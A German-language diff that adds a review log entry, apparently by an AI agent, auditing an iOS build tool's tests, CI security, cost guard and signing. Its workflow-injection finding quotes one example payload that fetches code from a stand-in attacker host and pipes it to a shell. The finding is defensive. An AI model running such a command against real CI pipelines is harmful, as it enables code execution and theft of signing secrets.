@@ -4,6 +4,212 @@ Der jeweils letzte Eintrag steht oben.
 
 ---
 
+## 2026-09-20 - CODEX (Review)
+
+**Agent:** CODEX
+**Rolle:** REVIEW (unabhaengiger Code-, Security-, CI/CD- und Test-Reviewer)
+**Startcommit:** `514ba0f`
+**Endcommit:** siehe Branch `codex/bb-review-phase1`
+**Umgebung:** Linux-Container, Python 3.11.15 - **kein Windows, kein Mac**
+
+### Tests
+
+Claudes Angabe von 137 Tests ist **reproduziert**: `Ran 137 tests - OK`,
+0 uebersprungen, deterministisch ueber drei Laeufe, ohne Netz
+(`HTTPS_PROXY` entfernt), ohne Zugriff auf `$HOME`, ohne Rueckstaende in `/tmp`.
+
+Gruene Tests wurden **nicht** als Beweis akzeptiert. Stattdessen Mutationstests:
+26 Sicherungsmechanismen einzeln kaputtgemacht und geprueft, ob die Suite das
+merkt. Ergebnis im Ausgangszustand: **22 von 26 gefunden, 4 nicht**.
+
+Die vier blinden Flecken waren:
+
+| Mechanismus | Warum es niemand gemerkt haette |
+|---|---|
+| `verify.py` Bundle-ID-Pruefung | ganz ohne Test |
+| `verify.py` Buildnummern-Pruefung | ganz ohne Test - ausgerechnet die App-Store-kritische |
+| Freigabe-Gate (Abschnitt 29) | alle Tests setzten `require_approval_for_mac_builds=False` |
+| `safe_child` Containment-Pruefung | Tests trafen nur die Vorpruefungen, nie die eigentliche Schranke |
+
+Nach den Korrekturen: **35 Mutanten, 35 gefunden, keiner ueberlebt.**
+
+Suite jetzt: **186 Tests, gruen.**
+
+### Windows-Test
+
+**NICHT DURCHGEFUEHRT - und das ist der wichtigste offene Punkt.**
+
+Diese Review-Sitzung lief in einem Linux-Container (`os.name='posix'`, kein
+`cmd.exe`, kein PowerShell, kein Wine). Eine Windows-Ausfuehrung war von hier
+aus unmoeglich. Wer etwas anderes behauptet, hat nicht nachgesehen.
+
+Stattdessen: statische Pruefung auf POSIX-Annahmen (Ergebnis: der Code ist
+sauber - `os.replace`, `mkdir`-Locks, `pathlib`, keine `fcntl`/`pwd`/`grp`,
+Pfadkomponenten lehnen beide Trennzeichen ab) **plus** ein Abnahmeskript, das
+Sebastian auf dem HP ausfuehrt:
+
+```
+cd burgys-builds
+python tests\windows_check.py
+```
+
+14 Pruefungen: Umlaut- und Leerzeichenpfade, Pfade >260 Zeichen, atomares
+Ersetzen, Ersetzen bei offenem Handle (Virenscanner-Fall), Sperren ueber acht
+echte Prozesse, git, `npm.cmd`, Dateirechte, exklusive Portbindung inklusive
+Uebernahmeversuch, QR-Dateien, IPA-Inspektion, volle Suite. Laeuft es nicht
+unter Windows, sagt es das und gibt sich ausdruecklich nicht als Abnahme aus.
+
+### Security
+
+Vier Befunde, alle behoben:
+
+1. **Workflow-Injection (hoch).** Das Template schrieb **16** `${{ }}`-Ausdruecke
+   direkt in `run:`-Shellskripte. GitHub ersetzt die *vor* der Shell, also
+   fuehrt eine Eingabe wie `x"; curl angreifer|sh; #` Code aus - in einem Job,
+   der auf einem **oeffentlichen** Repo das Distribution-Zertifikat und dessen
+   Passwort haelt. Behoben: alle Werte ueber `env:`, Zugriff als `"$VAR"`,
+   null Ausdruecke in Shellzeilen, plus ein Validierungsschritt, der jede
+   Eingabe gegen ein Muster prueft, bevor sie irgendetwas anfasst.
+2. **Signing-Secrets ohne menschliche Schranke (hoch).** Die Secrets lagen am
+   Repository, also fuer jeden Dispatch erreichbar. Behoben: der Job laeuft in
+   `environment: ios-signing`; die Secrets gehoeren an diese Umgebung mit
+   *Required reviewers*. Damit ist die Freigabe aus Abschnitt 29 dort
+   durchgesetzt, wo die Schluessel liegen.
+3. **Port-Uebernahme unter Windows (mittel, Windows-spezifisch).**
+   `allow_reuse_address = True` heisst unter Windows etwas anderes als unter
+   POSIX: ein *zweiter* Prozess darf denselben aktiv benutzten Port binden und
+   gewinnt. Jede Anfrage an diese API traegt das Agent-Token im Header. Behoben:
+   `SO_EXCLUSIVEADDRUSE` und kein `SO_REUSEADDR` unter Windows.
+4. **Kein Host-Header-Check (niedrig).** DNS-Rebinding war durch die
+   Tokenpflicht bereits abgefangen, aber eine Allowlist kostet nichts. Ergaenzt.
+
+Geprueft und in Ordnung: kein `pull_request`/`pull_request_target`-Trigger
+(Fork-PRs erreichen die Secrets nicht), `permissions: contents: read`, kein
+`GITHUB_TOKEN`-Gebrauch, `persist-credentials: false` ergaenzt, keine
+Zertifikate/Schluessel/Tokens im Repository (Dateiendungen und Inhalte
+durchsucht), Schwaerzung greift in Audit-Log, Manifest und API-Antworten.
+
+### Cost Guard
+
+Faellt geschlossen aus - unabhaengig nachgeprueft: alle PAID-Ressourcen
+blockiert, unbekannte Ressourcen als PAID behandelt, erschoepftes
+Freikontingent ohne kostenpflichtigen Fallback, Ledger ueberlebt Neustart.
+
+**Eine Anforderung fehlte aber:** Abschnitt 5 verlangt eine Allowlist normaler
+Standard-Runner. Es gab **keine** - `runs-on` wurde nirgends geprueft, nur in
+einem Kommentar erwaehnt. Ein Wechsel auf `macos-15-xlarge` waere durchgelaufen
+und haette Geld gekostet. Ergaenzt: `STANDARD_MACOS_RUNNERS`, `runs_on` ist
+jetzt Pflicht im `executor_config`, ein fehlendes Label blockiert, und ein Test
+haelt Template und Allowlist zusammen.
+
+### GitHub Runner
+
+Beide Pilot-Repos ueber die GitHub-API bestaetigt: `"private": false`,
+`visibility: "public"`, 0 Forks. Template nutzt `macos-latest` - Standard-Runner,
+auf oeffentlichen Repos kostenlos und unbegrenzt. Keine kostenpflichtigen
+Marketplace-Actions (nur `actions/checkout` und `actions/upload-artifact`),
+keine versteckte Cloud-Mac-Abhaengigkeit.
+
+### Signing
+
+Claudes Angaben aus den Artefakten selbst nachgelesen, **bestaetigt**:
+Team `38A4N26LD5`, beide Ad-Hoc-Profile mit je **2** registrierten Geraeten,
+Ablauf **2027-08-14 15:15:33**, `get-task-allow: false`, gemeinsames
+Distribution-Zertifikat. Keine UDIDs notiert, keine Zertifikate angefasst.
+
+### OTA
+
+Der bestehende Installer bleibt unangetastet. Das erzeugte Manifest ist
+byte-identisch mit dem ausgelieferten - nachgerechnet. Die OTA-Ablehnungen
+(Dry Run, falsche Signierung, abgelaufenes Profil, fremde Bundle ID, `http`)
+greifen alle, jede einzeln mutationsgeprueft.
+
+### Thy-Gnosis-Befund
+
+**CONFIRMED** - unabhaengig nachgerechnet.
+
+| | Groesse | SHA-256 |
+|---|---|---|
+| `web/index.html` in `thy-gnosis.ipa` | 55'844 B | `763e2efc41799f4a33c0938fafa28f01858ac2baba40460a17c5bee0c6c9a25d` |
+| `web/index.html` auf `main` (`242f5e44534a6da7`) | 57'952 B | `86d261ed51c89d6a5bdb7774d01393b357f7721c5dd42e882f10b88769316514` |
+| Browser-Version auf Pages | 58'199 B | `75ec2268d7a5ba4edf3bc8faf5550806d12ff2c6f5c40467cbaaee58a848749c` |
+
+IPA gebaut 2026-09-12 21:58:58, QA-Fixes-Commit `242f5e4` vom 2026-09-13 16:24.
+
+**Zusaetzlich, von Claude nicht dokumentiert: Days of Ruin ist genauso
+betroffen.** IPA 63'817 B / `960944f2c37d8aaa1c965f75150796c0250c8e964fb8e60dac9f48bf0d27f750`
+gegen `main` (`58400f7`) 65'885 B / `8850e7afb71da8c4e486732759d785779df05c248898e94232cedea1b054bfcf`.
+
+Keine IPA ersetzt.
+
+### Gefundene Fehler
+
+| Nr | Schwere | Befund |
+|---|---|---|
+| C-01 | hoch | Workflow-Injection: 16 `${{ }}` in `run:`-Blocks, Repo oeffentlich, Job haelt Signing-Secrets |
+| C-02 | hoch | Signing-Secrets am Repository statt an geschuetzter Umgebung - keine menschliche Schranke |
+| C-03 | mittel | Anforderung aus Abschnitt 5 fehlte: keine Runner-Allowlist, Larger Runner waere durchgelaufen |
+| C-04 | mittel | `allow_reuse_address` erlaubt unter Windows Port-Uebernahme; Token liegt im Header |
+| C-05 | mittel | `verify.py` Bundle-ID- und Buildnummern-Pruefung komplett ungetestet |
+| C-06 | mittel | Freigabe-Gate (Abschnitt 29) komplett ungetestet |
+| C-07 | niedrig | `safe_child`-Containment ungetestet (nur Vorpruefungen getroffen) |
+| C-08 | niedrig | `permissions_ok()` meldete unter Windows "ok", ohne je geprueft zu haben - ein Scheinerfolg |
+| C-09 | niedrig | `os.replace` ohne Retry; unter Windows scheitert es an offenen Handles (Virenscanner) |
+| C-10 | niedrig | Rate Limit nach IP - alle Aufrufer sind 127.0.0.1, ein lauter Client sperrt die anderen aus |
+| C-11 | niedrig | Kein Host-Header-Check (DNS-Rebinding-Haertung) |
+| C-12 | niedrig | Keine `.gitattributes`; `burgys.cmd` mit LF statt CRLF |
+| C-13 | Info | 3 von 137 Tests liefen nur, wenn zufaellig eine 5-MB-IPA daneben lag |
+| C-14 | Info | Drift betrifft beide Apps, dokumentiert war nur Thy Gnosis |
+
+### Behobene Fehler
+
+C-01 bis C-14 - alle. Jede Aenderung ist durch einen Test abgesichert, und
+jeder neue Schutz wurde mutationsgeprueft (kaputtmachen, Rotwerden pruefen).
+
+`verify.py` laesst sich jetzt ohne die echte IPA testen: `tests/helpers.py`
+baut synthetische, lesbare IPAs (Ad Hoc, App Store, Development, abgelaufen,
+unsigniert, ohne `web/`). Die Tests gegen die echte IPA bleiben zusaetzlich.
+
+**Nicht geaendert**, weil es eine Entscheidung und kein Fehler ist: die
+Export-Methode `ad-hoc`/`app-store`. Xcode 15.3 hat sie zugunsten von
+`release-testing`/`app-store-connect` als veraltet markiert; beide gelten
+derzeit. Das Template ist jetzt umschaltbar
+(`BURGYS_EXPORT_METHOD_ADHOC`/`_STORE`) und der Punkt steht in
+`KNOWN_ISSUES.md` als Risiko fuer den ersten echten Lauf.
+
+### Offene Blocker
+
+1. **Windows-Abnahme steht aus.** `python tests\windows_check.py` auf dem HP.
+   Bis dahin ist Buergys Builds unter Windows ungeprueft.
+2. **Kein macOS-Executor freigegeben.** Weg ist vorbereitet und kostenlos,
+   braucht Sebastians Entscheidung und die geschuetzte Umgebung.
+3. **`build_number_floor` weiterhin unbekannt.** Im Review gesucht und **nicht**
+   gefunden: keine Git-Tags in beiden Repos, `project.yml` steht auf `1`, beide
+   IPAs tragen `CFBundleVersion 1`, Codemagic setzt `$BUILD_NUMBER` erst zur
+   Laufzeit. Es gibt lokal **keine** Spur der an App Store Connect
+   uebermittelten Nummern. Bleibt Blocker - keine Nummer geraten.
+4. **`local_path`** fehlt fuer beide Projekte (nur auf dem HP zu setzen).
+5. **BB-I-003:** `fetch_artifact` im GitHub-Executor fehlt weiterhin. Ohne das
+   endet ein echter Build mit "liefert aber keine IPA".
+
+### Empfohlener naechster Schritt
+
+1. Sebastian: `python tests\windows_check.py` auf dem HP, Ausgabe zurueckgeben.
+2. Sebastian: `build_number_floor` aus App Store Connect ablesen
+   (App > TestFlight > iOS-Builds), fuer beide Apps.
+3. Codex/Claude: BB-I-003 (`fetch_artifact`) - der letzte Codeblocker vor einem
+   echten Build.
+4. Erst danach, und nur mit Sebastians ausdruecklicher Freigabe: geschuetzte
+   Umgebung einrichten, Secrets setzen, **erster Lauf von Hand in der
+   Actions-Oberflaeche**, zusehen, Export-Methode pruefen.
+
+**STOPP eingehalten:** kein echter macOS-Build gestartet, kein kostenpflichtiger
+Dienst aktiviert, kein App-Store-Upload, keine Zertifikate oder Profile
+veraendert, kein Codemagic-Workflow geloescht oder deaktiviert, keine IPA
+ersetzt.
+
+---
+
 ## 2026-09-20 - Claude (Lead)
 
 **Task-ID:** BB-001, BB-002, BB-003
